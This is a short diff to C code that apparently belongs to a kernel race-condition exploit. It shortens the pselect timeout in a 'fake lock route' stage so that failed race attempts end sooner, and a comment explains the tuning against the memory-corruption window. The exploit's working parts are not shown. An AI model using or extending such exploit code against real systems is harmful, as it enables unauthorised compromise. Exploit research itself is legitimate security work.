@@ -1,6 +1,14 @@
 #include "common.h"
 
 #define PSELECT_CFI_ROUTE_ATTEMPTS 26
+/*
+ * Route pselect timeout: winning attempts return early (the corruption
+ * wakes pselect), losing attempts burn the full timeout, so a short
+ * timeout only speeds up losing runs (26 attempts x 1s ~= 26s instead of
+ * ~2min). The consumer fires within 150ms (route_delay_usec sweep), so
+ * 1s is ample. The SLIDE keeps the 5s PSELECT_TIMEOUT_SEC.
+ */
+#define PSELECT_ROUTE_TIMEOUT_SEC 1
 
 atomic_int cfi_stage_done;
 ssize_t cfi_write_ret = -1;
@@ -137,7 +145,7 @@ void do_pselect_fake_lock_route(void) {
     atomic_store(&punch_consume_go, route_attempt);
 
     struct timespec timeout = {
-      .tv_sec = PSELECT_TIMEOUT_SEC,
+      .tv_sec = PSELECT_ROUTE_TIMEOUT_SEC,
       .tv_nsec = 0,
     };
     struct timespec *timeoutp = &timeout;
